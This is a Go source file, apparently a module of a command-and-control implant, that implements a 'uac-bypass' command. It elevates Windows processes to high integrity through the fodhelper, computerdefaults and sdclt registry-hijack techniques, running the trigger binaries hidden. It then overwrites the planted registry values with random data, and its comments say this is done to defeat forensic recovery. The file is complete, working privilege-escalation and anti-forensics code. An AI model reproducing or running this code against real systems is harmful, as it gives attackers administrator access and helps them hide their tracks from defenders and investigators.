//go:build windows
// +build windows

package commands

import (
	crand "crypto/rand"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// UACBypassCommand implements UAC bypass techniques for medium → high integrity escalation
type UACBypassCommand struct{}

func (c *UACBypassCommand) Name() string {
	return "uac-bypass"
}

func (c *UACBypassCommand) Description() string {
	return "Bypass User Account Control to elevate from medium to high integrity"
}

type uacBypassArgs struct {
	Technique string `json:"technique"` // fodhelper, computerdefaults, sdclt
	Command   string `json:"command"`   // command to run elevated (default: self)
}

func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
	var args uacBypassArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return errorf("Error parsing parameters: %v", err)
		}
	}

	if args.Technique == "" {
		args.Technique = "fodhelper"
	}

	// Check if already elevated — UAC bypass is unnecessary
	if isElevated() {
		return successResult("Already running at high integrity (elevated). UAC bypass not needed.\nUse getsystem to escalate to SYSTEM.")
	}

	// Default: spawn a new copy of ourselves for an elevated callback
	if args.Command == "" {
		exe, err := os.Executable()
		if err != nil {
			return errorf("Error getting executable path: %v", err)
		}
		args.Command = exe
	}

	switch strings.ToLower(args.Technique) {
	case "fodhelper":
		return uacBypassMsSettings(args.Command, resolveSystem32Binary("fodhelper.exe"), "fodhelper")
	case "computerdefaults":
		return uacBypassMsSettings(args.Command, resolveSystem32Binary("computerdefaults.exe"), "computerdefaults")
	case "sdclt":
		return uacBypassSdclt(args.Command)
	default:
		return errorf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt", args.Technique)
	}
}

// resolveSystem32Binary dynamically resolves a System32 path using
// environment variables instead of hardcoding C:\Windows.
func resolveSystem32Binary(binaryName string) string {
	windir := os.Getenv("WINDIR")
	if windir == "" {
		windir = os.Getenv("SystemRoot")
	}
	if windir == "" {
		windir = `C:\Windows`
	}
	return filepath.Join(windir, "System32", binaryName)
}

// isElevated checks if the current process token is elevated
func isElevated() bool {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()
	return token.IsElevated()
}

// uacBypassMsSettings implements the ms-settings registry hijack used by both
// fodhelper.exe and computerdefaults.exe. Both auto-elevate and read
// HKCU\Software\Classes\ms-settings\Shell\Open\command for the handler.
func uacBypassMsSettings(command, triggerBinary, techniqueName string) structs.CommandResult {
	var output string
	output += fmt.Sprintf("[*] UAC Bypass Technique: %s\n", techniqueName)
	output += fmt.Sprintf("[*] Trigger binary: %s\n", triggerBinary)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\ms-settings\Shell\Open\command`

	// Step 1: Create the registry key and set command
	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}

	// Set (Default) value to our command
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}

	// Set DelegateExecute to empty string — this is critical.
	// Without it, Windows uses the normal ms-settings protocol handler.
	// With an empty DelegateExecute, Windows falls back to the (Default) command value.
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupMsSettingsKey()
		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 2: Launch the auto-elevating trigger binary via ShellExecuteW.
	// Auto-elevating binaries (fodhelper, computerdefaults) have the autoElevate
	// manifest flag. ShellExecuteW triggers the elevation mechanism, while
	// CreateProcessW (exec.Command) fails with ERROR_ELEVATION_REQUIRED on Win11.
	output += "[*] Step 2: Launching trigger binary via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(triggerBinary)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupMsSettingsKey()
		return errorResult(output + fmt.Sprintf("Error launching %s: %v", triggerBinary, err))
	}
	output += fmt.Sprintf("[+] Launched %s via ShellExecute\n", triggerBinary)

	// Step 3: Wait briefly then clean up registry
	jitterSleep(1500*time.Millisecond, 3*time.Second)
	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
	cleanupMsSettingsKey()
	output += "[+] Registry keys shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupMsSettingsKey shreds values and removes the ms-settings hijack registry keys
func cleanupMsSettingsKey() {
	keyPath := `Software\Classes\ms-settings\Shell\Open\command`
	shredRegistryKey(registry.CURRENT_USER, keyPath)
	// Delete parent keys (deepest first)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell\Open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings\Shell`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\ms-settings`)
}

// uacBypassSdclt implements the sdclt.exe Folder handler hijack.
// sdclt.exe auto-elevates and reads HKCU\Software\Classes\Folder\shell\open\command.
func uacBypassSdclt(command string) structs.CommandResult {
	sdcltPath := resolveSystem32Binary("sdclt.exe")

	var output string
	output += "[*] UAC Bypass Technique: sdclt\n"
	output += fmt.Sprintf("[*] Trigger binary: %s\n", sdcltPath)
	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)

	regKeyPath := `Software\Classes\Folder\shell\open\command`

	// Step 1: Create the registry key and set command
	output += "[*] Step 1: Setting registry key...\n"
	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
	if err != nil {
		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
	}

	// Set (Default) value to our command
	if err := key.SetStringValue("", command); err != nil {
		key.Close()
		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
	}

	// DelegateExecute must be set (empty string) for the Folder handler too
	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
		key.Close()
		cleanupSdcltKey()
		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
	}
	key.Close()
	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)

	// Step 2: Launch sdclt.exe via ShellExecuteW (same reason as ms-settings: auto-elevate needs ShellExecute)
	output += "[*] Step 2: Launching sdclt.exe via ShellExecute...\n"
	verbPtr, _ := windows.UTF16PtrFromString("open")
	filePtr, _ := windows.UTF16PtrFromString(sdcltPath)
	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
	if err != nil {
		cleanupSdcltKey()
		return errorResult(output + fmt.Sprintf("Error launching sdclt.exe: %v", err))
	}
	output += "[+] Launched sdclt.exe via ShellExecute\n"

	// Step 3: Wait briefly then clean up registry
	jitterSleep(1500*time.Millisecond, 3*time.Second)
	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
	cleanupSdcltKey()
	output += "[+] Registry keys shredded and removed\n\n"

	output += "[+] UAC bypass triggered successfully.\n"
	output += "[*] If successful, a new elevated callback should appear shortly.\n"
	output += "[*] The elevated process runs at high integrity (admin)."

	return successResult(output)
}

// cleanupSdcltKey shreds values and removes the Folder handler hijack registry keys
func cleanupSdcltKey() {
	keyPath := `Software\Classes\Folder\shell\open\command`
	shredRegistryKey(registry.CURRENT_USER, keyPath)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell\open`)
	_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell`)
	// Don't delete Software\Classes\Folder — it may have legitimate content
}

// shredRegistryValue overwrites a registry string value with random data 3 times
// before deleting it. This defeats forensic recovery of deleted registry values
// from hive slack space (RegRipper, Registry Explorer, Volatility).
func shredRegistryValue(key registry.Key, valueName string) {
	for i := 0; i < 3; i++ {
		_ = key.SetStringValue(valueName, randomShredString())
	}
	_ = key.DeleteValue(valueName)
}

// shredRegistryKey opens a registry key, shreds all its string values, then
// deletes the key. Falls back to plain DeleteKey if the key can't be opened
// for writing (e.g., insufficient permissions).
func shredRegistryKey(hive registry.Key, path string) {
	key, err := registry.OpenKey(hive, path, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		// Can't open for writing — just try to delete
		_ = registry.DeleteKey(hive, path)
		return
	}
	names, err := key.ReadValueNames(-1)
	if err == nil {
		for _, name := range names {
			shredRegistryValue(key, name)
		}
	}
	key.Close()
	_ = registry.DeleteKey(hive, path)
}

// randomShredString generates a random 64-character string for registry
// value overwriting. Uses crypto/rand for unpredictable content.
func randomShredString() string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 64)
	_, _ = crand.Read(b)
	for i := range b {
		b[i] = charset[b[i]%byte(len(charset))]
	}
	return string(b)
}
